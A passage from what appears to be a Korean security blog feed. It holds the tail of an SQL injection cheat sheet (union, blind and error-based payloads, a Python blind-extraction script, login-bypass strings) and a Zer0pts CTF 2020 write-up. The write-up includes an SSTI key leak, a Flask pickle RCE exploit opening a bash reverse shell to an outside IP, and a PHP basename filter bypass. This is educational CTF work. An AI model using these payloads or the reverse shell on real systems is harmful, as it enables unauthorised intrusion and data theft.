null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br><br>(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; order by 1<br><br><span style="color:#3E386D">→</span> &#39; order by 2<br><br><span style="color:#3E386D">→</span> &#39; order by 3<br><br><span style="color:#3E386D">→</span> &#39; order by 4<br><br><span style="color:#3E386D">→</span> &#39; order by N<br><br>(If an error occurs using <code>order by</code>, the number of columns in use is N-1.)<br></p></blockquote><blockquote><p><span style="color:#3E386D">→</span> &#39; union select current_database(), null, null, null<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(table_name, &#39;,&#39;), null, null, null from information_schema.tables<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name = &#60;table_name&#62;<br><br><span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;</p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><hr><h2 id="Boolean-Based-Blind-SQL-Injection"><a href="#Boolean-Based-Blind-SQL-Injection" class="headerlink" title="Boolean Based Blind SQL Injection"></a>Boolean Based Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or if(length(database())  &gt;N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if(ascii(substr(database(),1,1)) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(table_name) from information_schema.tables) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(table_name,1,1)) from information_schema.tables) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(column_name) from information_schema.columns where table_name = &#60;table_name&#62;) &gt; N, 1, 0)&#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select count(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select length(&#60;column_name&#62;) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(&#60;column_name&#62;,1,1)) from &#60;table_name&#62;) &gt; N, 1, 0) &#8211;&#8211;<br></p></blockquote><hr><h2 id="Efficient-Blind-SQL-Injection"><a href="#Efficient-Blind-SQL-Injection" class="headerlink" title="Efficient Blind SQL Injection"></a>Efficient Blind SQL Injection</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">condition result = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">range</span>):</span><br><span class="line">  binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    query = <span class="string">&quot;&#x27;or substr(lpad(bin(ascii(substr(database(), i, 1))), 7, 0), j, 1)%23&quot;</span></span><br><span class="line">    res = requests.get(url + query)</span><br><span class="line">    <span class="keyword">if</span> condition <span class="keyword">in</span> res.text:</span><br><span class="line">      binary += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      binary += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">  result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">  </span><br><span class="line">print(<span class="string">&quot;[+] Result : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br></pre></td></tr></table></figure><hr><h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> MsSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> Oracle</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> SQLite</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1==1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;-<br></p></blockquote><p><b><em><span style="color:#631F9C">&#62;</span> PgSQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&gt;0 &#8211;&#8211;<br><br><span style="color:#3E386D">→</span> &#39;or 1&lt;&gt;0 &#8211;&#8211;<br></p></blockquote><hr><h2 id="ETC"><a href="#ETC" class="headerlink" title="ETC"></a>ETC</h2><p><b><em><span style="color:#631F9C">&#62;</span> MySQL</em></b></p><blockquote><p><span style="color:#3E386D">→</span> pow(<del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as id), 9999)<br><span style="color:#3E386D">→</span> exp(</del>(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as a) * 9999)</p></blockquote><p><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 테이블의 존재하는 모든 칼럼을 에러에 포함시켜 출력시킬 수 있습니다. 대신 테이블 이름과 칼럼 이름을 하나 알고 있어야 합니다.</strong><br></p><blockquote><p><span style="color:#3E386D">→</span> select extractvalue(rand(),concat(0x3a,((select &#60;column_name&#62; from &#60;table_name&#62; limit 0, 1))))<br><strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 컬럼 값을 에러에 포함시켜 출력시킬 수 있습니다.</strong></p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CheatSheet </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zer0pts CTF 2020 Write Up</title>
      <link href="2020/12/26/2020-12-26-Zer0pts-CTF-2020/"/>
      <url>2020/12/26/2020-12-26-Zer0pts-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p><strong>Zer0pts CTF는 일본팀인 Zer0pts에서 주최한 대회입니다. 2020 대회는 3월 7일에 열렸지만 도커 파일이 남아 있어 문제를 풀어 보았습니다. 그리고 서버 구축은 아래와 같이 하면 됩니다.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;gitlab.com&#x2F;zer0pts&#x2F;zer0pts-ctf-2020.git</span><br><span class="line">cd zer0pts-ctf-2020</span><br><span class="line">cd &lt;Desired Problem&gt;</span><br><span class="line">docker-compose up -d ( if the &#96;-d&#96; option given, it is excuted as the backend. )</span><br></pre></td></tr></table></figure><hr><h3 id="Web-notepad-332pts"><a href="#Web-notepad-332pts" class="headerlink" title="(Web) notepad [332pts]"></a>(Web) notepad [332pts]</h3><p><strong>notepad 문제는 Python Pickle 모듈의 loads 함수에서 발생하는 RCE 취약점과 Flask SSTI 취약점을 주제로 한 문제입니다. 일단 app.py가 주어지는데 필요한 부분만 확인을 해보겠습니다.</strong><br><br></p><p><b><em><span style="color:#631F9C">&#62;</span> SSTI Vuln</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">error</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Automatically go back when page is not found &quot;&quot;&quot;</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">&quot;Referer&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Refresh&quot; content=&quot;3;URL=&#123;&#125;&quot;&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;&#x27;</span>.<span class="built_in">format</span>(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p><strong>404 에러 페이지를 확인해보면 <code>Referer</code> 헤더를 가져와서 <code>URL</code> 값으로 그대로 사용하는 것을 볼 수 있습니다. Referer의 대한 검증 과정이 존재하지 않아 SSTI 취약점이 발생합니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%2012.59.35.png?raw=true"><br><strong>그래서 Referer 헤더로 &#123;&#123;config&#125;&#125;를 보내주니 SSTI가 발생해서 config 객체를 출력해주는 것을 볼 수 있고, 시크릿 키가 <code>b&#39;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#39;</code>라는 것을 알 수 있습니다. 시크릿 키를 구했기 때문에 <code>session</code>을 마음대로 조작이 가능할 거 같습니다.</strong></p><p><b><em><span style="color:#631F9C">&#62;</span> Python Pickle Deserialization Vuln</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/note/&lt;int:nid&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span>(<span class="params">nid=<span class="number">0</span></span>):</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>, data=data, nid=nid)</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot; Load saved notes &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">&#x27;savedata&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">&quot;date&quot;</span>: now(), <span class="string">&quot;text&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;title&quot;</span>: <span class="string">&quot;*New Note*&quot;</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p><strong>/note를 보면 load() 함수를 호출하는 것을 볼 있습니다. load() 함수는 세션 값에서 <code>savedata</code>라는 값을 가져와서 base64 디코딩을 하고, pickle.loads() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. 바로 여기서 RCE 취약점이 발생합니다. 해당 취약점에 자세한 내용은 구글을 통해 확인할 수 있습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.12.42.png?raw=true"><br><strong>Flask 세션 관련 내용을 정확히 숙지하고 있지 않아서 구글에 검색을 해보니 <code>sessions.SecureCookieSessionInterface</code>, <code>Flask</code> 두 함수를 이용하면 시크릿 키를 이용해 세션 값을 만들어 줄 수 있는 것을 알 수 있었습니다. 물론 Flask 함수를 쓰지 않고 클래스를 생성해서도 줄 수 있습니다.</strong><br><br></p><p><strong>그러니 시크릿 키를 이용해서 세션 값을 변조하고, 변조한 세션 값을 가지고, /note/<a href="int:id">int:id</a>로 접근을 해주면 load() 함수의 pickle.loads() 함수가 호출이 돼서 RCE가 발생하게 됩니다. </p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>   │ <span class="keyword">import</span> os, sys, base64, pickle, requests</span><br><span class="line"> <span class="number">2</span>   │ <span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"> <span class="number">3</span>   │ <span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"> <span class="number">4</span>   │</span><br><span class="line"> <span class="number">5</span>   │ cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/141.164.52.207/12345 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"> <span class="number">6</span>   │ key_ = <span class="string">b&#x27;$\x9e\x15\x12\xd7\x1d\x9c\x01\x05\x91\x1332\xd9(m&#x27;</span></span><br><span class="line"> <span class="number">7</span>   │ <span class="class"><span class="keyword">class</span> <span class="title">RCE</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"> <span class="number">8</span>   │     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line"> <span class="number">9</span>   │         <span class="keyword">return</span> (os.system,(cmd,))</span><br><span class="line"><span class="number">10</span>   │</span><br><span class="line"><span class="number">11</span>   │ <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line"><span class="number">12</span>   │     app = Flask(<span class="string">&quot;app&quot;</span>)</span><br><span class="line"><span class="number">13</span>   │     app.secret_key = key_</span><br><span class="line"><span class="number">14</span>   │</span><br><span class="line"><span class="number">15</span>   │     sscsi = SecureCookieSessionInterface()</span><br><span class="line"><span class="number">16</span>   │     signingSerializer = sscsi.get_signing_serializer(app)</span><br><span class="line"><span class="number">17</span>   │</span><br><span class="line"><span class="number">18</span>   │     session = signingSerializer.dumps(&#123;<span class="string">&#x27;savedata&#x27;</span>:base64.b64encode(pickle.dumps(RCE()))&#125;)</span><br><span class="line"><span class="number">19</span>   │     print(<span class="string">&quot;Sessions : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(session))</span><br><span class="line"><span class="number">20</span>   │     requests.get(<span class="string">&#x27;http://localhost:8001/note/1&#x27;</span>, cookies = &#123;<span class="string">&#x27;session&#x27;</span>:session&#125;)</span><br><span class="line"><span class="number">21</span>   │</span><br><span class="line"><span class="number">22</span>   │ <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="number">23</span>   │     print(<span class="string">&quot;[+] RCE in Pickle Start&quot;</span>)</span><br><span class="line"><span class="number">24</span>   │     exploit()</span><br></pre></td></tr></table></figure><p><strong>그래서 파이썬을 이용해서 위와 같이 RCE POC를 작성해주었습니다. 처음에는 <code>nc</code>를 이용해서 쉘을 딸려 했지만 잘 되지 않았습니다. 그래서 그냥 코드 미스인 줄 알았는데 <code>bash -c</code>를 이용해서 쉘을 따주니 잘 되었습니다.</strong><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-27%20%EC%98%A4%ED%9B%84%201.35.23.png?raw=true"><br><strong>RCE POC를 돌려주니 쉘이 잘 따지는 것을 볼 수 있고, flag도 볼 수 있었습니다. ( nc 명령어를 확인해보니 명령어 자체가 없었음 )</strong></p><p><code>FLAG : zer0pts&#123;fl4sk_s3ss10n_4nd_pyth0n_RCE&#125;</code></p><hr><h3 id="Web-Can-you-guess-it-345pts"><a href="#Web-Can-you-guess-it-345pts" class="headerlink" title="(Web) Can you guess it [345pts]"></a>(Web) Can you guess it [345pts]</h3><p><strong>Can you guess it 문제는 PHP 트릭류 문제입니다. </strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">&#x27;ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href=&quot;?source&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;text&quot; name=&quot;guess&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;input type=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p><b><em><span style="color:#631F9C">&#62;</span> analysis</em></b></p><p><strong>FLAG는 config.php에 정의가 되어 있다고 합니다.</strong><br><br></p><p><strong>코드를 보면 $_SERVER[‘PHP_SELF’]의 값을 highlight_file() 함수의 인자로 넘겨주는 것을 볼 수 있습니다. $_SERVER[‘PHP_SELF’]는 현재 페이지의 주소에서 도메인과 넘어가는 값(파라미터)를 제외한 것들을 가져오는 슈퍼 글로벌 함수 입니다. 즉, Path만 가져온다는 것 입니다.</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>하지만 preg_match() 함수를 이용해서 $_SERVER[‘PHP_SELF’] 값을 검증하고 있기 때문에 일반적으로 접근을 하게 되면 <code>config.php</code>가 필터링에 걸리기 때문에 힘들 거 같습니다.</strong><br><br></p><p><strong>그러다 구글링을 하다가 <a href="https://ngaa.tistory.com/m/46?category=776250">여기서</a> 신기한 것을 발견했습니다. basename 함수에 \x80-\xff 범위의 값 중 하나만 들어오면 그 값은 무시한다는 것을 알 수 있었습니다.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xbb&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xab&quot;);</span><br><span class="line">config.php</span><br><span class="line">php &gt; echo basename(&quot;&#x2F;index.php&#x2F;config.php&#x2F;\xff&quot;);</span><br><span class="line">config.php</span><br></pre></td></tr></table></figure><p><strong>테스트를 해본 결과 \x80-\xff 범위의 값을 모두 무시하는 것을 확인할 수 있었습니다. 그리고 저 범위의 값들이 prge_match에 들어가도 우회가 됩니다.</strong> </p><p><b><em><span style="color:#631F9C">&#62;</span> Exploit</em></b></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;%aa?source</span><br></pre></td></tr></table></figure><p><strong>위 path로 접근을 해주면 preg_match(), basename() 함수를 우회해 config.php의 소스 코드를 볼 수 있습니다.</strong></p><p><code>FLAG : zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;</code></p><hr><h3 id="Web-urlapp-435pts"><a href="#Web-urlapp-435pts" class="headerlink" title="(Web) urlapp [435pts]"></a>(Web) urlapp [435pts]</h3><p><strong>urlapp 문제는 루비로 작성된 Redis 서비스에서 Redis SSRF 취약점을 주제로한 문제입니다. 하지만 왠지 모르게 익스를 계속 시도해도 set 명령어가 제대 인식이 되지 않는 거 같다. </strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">&quot;GET <span class="subst">#&#123;key&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span 